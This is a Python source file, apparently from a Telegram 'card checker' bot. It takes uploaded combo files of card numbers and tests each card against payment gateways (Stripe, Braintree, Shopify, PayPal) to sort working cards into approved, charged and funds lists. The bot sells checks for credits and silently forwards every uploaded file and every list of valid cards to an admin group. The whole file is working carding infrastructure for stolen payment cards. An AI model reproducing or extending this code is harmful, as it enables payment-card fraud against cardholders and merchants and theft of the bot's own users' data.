import threading
import time
import io
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from telebot import types
from utils.admin_guard import is_admin
from utils.classify import *
from storage.repositories.bans import is_banned
from security.channel_guard import *
from storage.repositories.credits import *
from storage.repositories.gates import *
from datetime import datetime
# --- تعديل: استيراد ADMIN_GROUP ---
from config.settings import ADMIN_GROUP, HIT_CHAT
from utils.messages import (
    approved_message,
    charged_message,
    insufficient_funds_message,
    dato, hit_detected_message
)
from collections import defaultdict
from threading import Lock

# ================= Import Gates ==================
from gates.stripe_auth import check as stripe_auth_check
from gates.braintree_auth import check as braintree_auth_check
from gates.shopify_charge import check as shopify_charge_check
from gates.stripe_charge import check as stripe_charge_check
from gates.paypal_donation import check as paypal_donation_check

# ==================== Global ====================
MAX_THREADS = 20
cpu_count = multiprocessing.cpu_count()
max_threads = min(MAX_THREADS, max(1, cpu_count if cpu_count else 1))
executor = ThreadPoolExecutor(max_workers=max_threads)
print(f"Using {max_threads} threads based on CPU cores.")

user_locks = defaultdict(Lock)
sessions = {}
bot_instance = None

class ComboSession:
    def __init__(self, cards, original_filename): # <-- تعديل: إضافة اسم الملف الأصلي
        self.cards = cards
        self.original_filename = original_filename # <-- تعديل: تخزين اسم الملف
        self.stop = False
        self.checking = False
        self.approved = 0
        self.charged = 0
        self.funds = 0
        self.declined = 0
        self.checked = 0
        self.approved_cards = []
        self.charged_cards = []
        self.funds_cards = []
        self.lock = Lock()

GATES = {
    "stripe_auth": ("Stripe_Auth", stripe_auth_check, "AUTH"),
    "braintree_auth": ("Braintree_Auth", braintree_auth_check, "AUTH"),
    "shopify_charge": ("Shopify_Charge", shopify_charge_check, "CHARGE"),
    "stripe_charge": ("Stripe_Charge", stripe_charge_check, "CHARGE"),
    "paypal_donation": ("Paypal_Donation", paypal_donation_check, "CHARGE"),
}

MAX_RETRY = 3

def build_progress(percent: int, size: int = 10):
    filled = int((percent / 100) * size)
    return f"{'▰' * filled}{'▱' * (size - filled)} {percent}%"

def register_combo(bot):
    global bot_instance
    bot_instance = bot

    @bot.message_handler(content_types=["document"])
    def receive_combo(message):
        uid = message.from_user.id
        user_id = message.from_user.id
        user = message.from_user
        user_name = user.first_name
        now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        
        caption = f"""
📥 <b>NEW FILE RECEIVED</b>

👤 Name : {user.first_name}
🔗 Username : @{user.username if user.username else 'None'}
🆔 ID : {user.id}
⏰ Time : {now}
📄 File : {message.document.file_name}
        """
        
        # --- تعديل: الإرسال إلى مجموعة الإدارة بدلاً من كل أدمن على حدة ---
        try:
            bot.send_document(ADMIN_GROUP, message.document.file_id, caption=caption, parse_mode="HTML")
        except Exception as e:
            print(f"⚠️ Could not send to admin group {ADMIN_GROUP}: {e}")

        file_name = message.document.file_name.lower()
        if not file_name.endswith(".txt"):
            bot.send_message(message.chat.id, "<b>❌ ONLY .TXT FILES ARE ALLOWED</b>", parse_mode="HTML")
            return

        if is_banned(uid):
            bot.send_message(message.chat.id, "<b>🚫 YOU ARE BANNED FROM USING THIS BOT</b>", parse_mode="HTML")
            return
            
        if not is_channel_subscribed(bot, user_id):
            send_channel_prompt(bot, message.chat.id, name)
            return
            
        if uid in sessions and sessions[uid].checking:
            bot.send_message(message.chat.id, "<b>❌ A CHECK IS ALREADY RUNNING</b>", parse_mode="HTML")
            return

        wait = bot.send_message(message.chat.id, "<b>⏳ PROCESSING YOUR COMBO FILE...</b>", parse_mode="HTML")

        try:
            file_info = bot.get_file(message.document.file_id)
            raw = bot.download_file(file_info.file_path)
            cards = [c.strip() for c in raw.decode(errors="ignore").splitlines() if c.strip()]
        except Exception as e:
            bot.edit_message_text(f"<b>❌ FAILED TO PROCESS FILE: {e}</b>", message.chat.id, wait.message_id, parse_mode="HTML")
            return

        if uid in sessions:
            del sessions[uid]

        sessions[uid] = ComboSession(cards, message.document.file_name)

        if not cards:
            bot.edit_message_text("<b>❌ EMPTY FILE</b>", message.chat.id, wait.message_id, parse_mode="HTML")
            return

        ensure_row(uid)
        
        kb = types.InlineKeyboardMarkup(row_width=1)
        for key, (name, _, _) in GATES.items():
            if is_gate_enabled(key):
                kb.add(types.InlineKeyboardButton(name, callback_data=f"combo:gate:{key}"))

        bot.edit_message_text("<b>ϟ CHOOSE THE GATEWAY ϟ</b>", message.chat.id, wait.message_id, reply_markup=kb, parse_mode="HTML")

    @bot.callback_query_handler(func=lambda c: c.data == "combo:stop")
    def stop_combo(c):
        uid = c.from_user.id
        if uid in sessions:
            sessions[uid].stop = True
            bot.answer_callback_query(c.id, "⛔ Stop requested")

    @bot.callback_query_handler(func=lambda c: c.data.startswith("combo:gate:"))
    def start_check(c):
        uid = c.from_user.id
        user_name = c.from_user.first_name
        gate_key = c.data.split(":")[-1]

        session = sessions.get(uid)
        if not session or session.checking:
            bot.answer_callback_query(c.id, "A check is already running or session expired.", show_alert=True)
            return

        gate_name, gate_func, gate_type = GATES[gate_key]
        total = len(session.cards) if is_admin(uid) else min(len(session.cards), get_limit(gate_key))
        cost = get_cost(gate_key)

        with user_locks[uid]:
            if not is_admin(uid) and get_credits(uid) < cost * total:
                bot.answer_callback_query(c.id, "⛔ Insufficient credits for this check.", show_alert=True)
                return

        session.checking = True
        session.stop = False

        chat_id = c.message.chat.id
        message_id = c.message.message_id

        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("━ 𝗖𝗖 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton("━ 𝗦𝗧𝗔𝗧𝗨𝗦 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • 0", callback_data="x"),
            types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • 0", callback_data="x"),
            types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • 0 / {total}", callback_data="x"),
            types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
        )

        bot.edit_message_text(
            f"<b>PLEASE WAIT CHECKING YOUR CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n{build_progress(0)}\n━━━━━━━━━━━━━━━━━━━━━━━</b>",
            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
        )

        executor.submit(run_check, uid, chat_id, message_id, gate_key, total, cost, user_name)

def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
    session = sessions.get(uid)
    if not session: return

    gate_name, gate_func, gate_type = GATES[gate_key]
    last_update_time = time.time()

    try:
        for i, card in enumerate(session.cards[:total]):
            if session.stop: break

            current_credits = get_credits(uid)
            if not is_admin(uid) and not is_vip_active(uid) and current_credits < cost:
                session.stop = True
                try:
                    bot_instance.send_message(chat_id, "<b>⚠️ CHECK STOPPED - INSUFFICIENT CREDITS</b>", parse_mode="HTML")
                except: pass
                break

            start_time = time.time()
            r_text = "Network Error"

            for _ in range(MAX_RETRY):
                try:
                    r_text = gate_func(card)
                    if r_text and "error" not in r_text.lower():
                        break
                except Exception:
                    r_text = "error"
                time.sleep(0.5)

            exec_time = round(time.time() - start_time, 2)
            r_lower = r_text.lower()
            
            message_to_send = None
            hit_type = None

# ... (الكود الجديد داخل دالة run_check) ...
            result_status = classify_result(r_text) # استخدم الدالة الجديدة للتصنيف
            
            message_to_send = None
            hit_type = None

            with session.lock:
                if result_status == "CHARGED":
                    session.charged += 1
                    session.charged_cards.append(card)
                    message_to_send = charged_message(card, r_text, gate_name, exec_time, dato)
                    hit_type = "charged"
                elif result_status == "APPROVED":
                    session.approved += 1
                    session.approved_cards.append(card)
                    message_to_send = approved_message(card, r_text, gate_name, exec_time, dato)
                    hit_type = "approved"
                elif result_status == "FUNDS":
                    session.funds += 1
                    session.funds_cards.append(card)
                    message_to_send = insufficient_funds_message(card, r_text, gate_name, exec_time, dato)
                    hit_type = "funds"
                else: # Declined
                    session.declined += 1
                
                session.checked += 1


            if message_to_send:
                try:
                    bot_instance.send_message(chat_id, message_to_send, parse_mode="HTML")

                    bot_instance.send_message(HIT_CHAT, hit_detected_message(user_name, hit_type, exec_time, gate_name), parse_mode="HTML")
                except Exception as e:
                    print(f"Error sending hit message: {e}")


            if not is_admin(uid) and not is_vip_active(uid) and "error" not in r_lower:
                with user_locks[uid]:

                    from storage.repositories.credits import deduct_credits
                    from storage.repositories.gates import get_cost
                    
                    cost_to_deduct = get_cost(gate_key)
                    deduct_credits(uid, cost_to_deduct)


            if time.time() - last_update_time >= 2:
                last_update_time = time.time()
                update_progress_ui(uid, chat_id, message_id, card, r_text, gate_name, total, gate_type)

    finally:
        session.checking = False
        update_progress_ui(uid, chat_id, message_id, "N/A", "Finished", gate_name, total, gate_type, force_update=True)
        
        summary_text = f"<b>✨ CHECK SUMMARY ✨</b>\n" \
                       f"━━━━━━━━━━━━━━━━━━\n" \
                       f"Approved  ✅ : {session.approved}\n" \
                       f"Charged   ⚡ : {session.charged}\n" \
                       f"Funds     💸 : {session.funds}\n" \
                       f"Declined  ❌ : {session.declined}\n" \
                       f"━━━━━━━━━━━━━━━━━━\n" \
                       f"Processed : {session.checked} / {total}\n" \
                       f"━━━━━━━━━━━━━━━━━━"
        try:
            bot_instance.send_message(chat_id, summary_text, parse_mode="HTML")
        except Exception as e:
            print(f"Error sending summary: {e}")

        # --- تعديل: تمرير اسم الملف الأصلي إلى دالة send_file ---
        original_filename = session.original_filename
        send_file(uid, chat_id, "approved", session.approved_cards, gate_name, original_filename)
        send_file(uid, chat_id, "charged", session.charged_cards, gate_name, original_filename)
        send_file(uid, chat_id, "funds", session.funds_cards, gate_name, original_filename)
        
        if uid in sessions:
            del sessions[uid]

def update_progress_ui(uid, chat_id, message_id, card, result, gate_name, total, gate_type, force_update=False):
    session = sessions.get(uid)
    if not session: return

    with session.lock:
        checked = session.checked
        percent = int((checked / total) * 100) if total > 0 else 0
        
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
            types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {result}", callback_data="x"),
            types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • {session.approved if gate_type == 'AUTH' else session.charged}", callback_data="x"),
            types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • {session.declined if gate_type == 'AUTH' else session.funds}", callback_data="x"),
            types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {checked} / {total}", callback_data="x"),
            types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
        )

    try:
        bot_instance.edit_message_text(
            f"<b>PLEASE WAIT CHECKING YOUR CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n{build_progress(percent)}\n━━━━━━━━━━━━━━━━━━━━━━━</b>",
            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
        )
    except Exception:
        pass

# --- تعديل شامل لدالة send_file ---
# في نهاية ملف combo.py

# --- تعديل شامل لدالة send_file لتحقيق الطلب الأخير ---
def send_file(uid, user_chat_id, result_type, data, gate_name, original_filename):
    if not data: return

    # --- 1. الإرسال إلى المستخدم ---
    try:
        # إعداد المحتوى للملف
        user_content = "\n".join(data)
        user_bio = io.BytesIO(user_content.encode())
        
        # هذا هو اسم الملف الذي طلبته بالضبط
        user_bio.name = f"[@chk_error_bot] {result_type}.txt"
        
        # إرسال الملف للمستخدم بدون كابشن
        bot_instance.send_document(user_chat_id, user_bio)
    except Exception as e:
        print(f"Could not send file to user {uid}: {e}")

    # --- 2. الإرسال إلى مجموعة الإدارة (يبقى كما هو) ---
    try:
        # إعداد المحتوى مرة أخرى (أو إعادة استخدام المؤشر)
        admin_content = "\n".join(data)
        admin_bio = io.BytesIO(admin_content.encode())
        
        # اسم الملف الواضح لمجموعة الإدارة
        admin_filename = f"[{result_type.upper()}] - {original_filename}"
        admin_bio.name = admin_filename
        
        # إعداد الكابشن التفصيلي
        user = bot_instance.get_chat(uid)
        now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        caption = f"""
📊 <b>{result_type.upper()} RESULT</b>

👤 From User: {user.first_name} (@{user.username or 'None'})
🆔 User ID: <code>{user.id}</code>
🌐 Gate: {gate_name}
⏰ Time: {now}
        """
        
        # إرسال الملف والكابشن إلى مجموعة الإدارة
        bot_instance.send_document(ADMIN_GROUP, admin_bio, caption=caption, parse_mode="HTML")
    except Exception as e:
        print(f"⚠️ Could not send file to admin group {ADMIN_GROUP}: {e}")


